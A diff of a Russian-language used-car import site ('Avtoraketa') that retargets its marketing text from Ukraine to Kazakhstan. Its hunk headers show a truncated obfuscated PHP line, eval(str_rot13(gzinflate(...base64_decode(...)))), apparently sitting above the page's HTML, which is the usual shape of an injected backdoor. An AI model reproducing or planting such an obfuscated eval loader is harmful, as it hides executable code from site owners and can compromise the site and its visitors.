@@ -6,7 +6,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
 <html class="wide wow-animation" lang="ru">
   <head>
     <!-- Site Title-->
-    <title>Купить БУ Авто из США и Грузии в Украине ✅ Цены от от 7,000$ |  Avtoraketa</title>
+    <title>Купить БУ Авто из США и Грузии в Казахстане  ✅ Цены от от 7,000$ |  Avtoraketa</title>
     <meta charset="utf-8">
 	<meta property="og:title" content="Avtoraketa - доставка авто из США и Грузии">
     <meta property="og:site_name" content="Avtoraketa">
@@ -14,7 +14,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <meta property="og:description" content="Предоставляем улуги профессионального пригона авто из США и Грузии">
     <meta property="og:image" content="/images/avtoraketa.jpg">
 	<meta name="description" content="Авторакета - это выгодная покупка авто с аукционов Америки и авторынков Грузии">
-	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Украину, с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
+	<meta name="keywords" content="Авторакета: Поставщик автомобилей из Америки и Грузии в Казахстан , с аукционов Copart, Manheim, IAAI. Автомобили в наличии, автомобильный аукцион. Самая надежная компания, работа под ключ.">
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <script src="/cdn-cgi/apps/head/3ts2ksMwXvKRuG480KNifJ2_JNM.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -298,7 +298,7 @@ src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
               <article class="box-minimal-modern">
                 <div class="box-minimal-icon mdi mdi-magnify"></div>
                 <h6 class="box-minimal-title">Логистика и Растаможка</h6>
-                <div class="box-minimal-text">После оплаты выкупленного авто и сопутствующих платежей, ваш автомобиль будет доставлен в Казахстан. После растаможки автомобиль будет готов к выдаче в порту.</div>
+                <div class="box-minimal-text">После оплаты выкупленного авто и сопутствующих платежей, ваш автомобиль будет доставлен в Казахстан  . После растаможки автомобиль будет готов к выдаче в порту.</div>
               </article>
             </div>
           </div>
